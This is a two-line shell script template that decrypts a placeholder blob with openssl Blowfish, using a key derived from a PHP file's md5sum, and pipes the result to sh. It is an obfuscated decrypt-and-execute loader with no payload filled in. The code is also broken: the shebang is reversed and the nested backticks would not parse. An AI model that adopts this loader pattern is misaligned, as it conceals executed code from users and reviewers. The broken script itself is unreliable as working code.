!#/bin/sh
echo '###ENCODED###' | openssl enc -blowfish -d -a -k `md5sum `basename "$0" .sh`.php | od -A n -t x1` -iv ###IV### | sh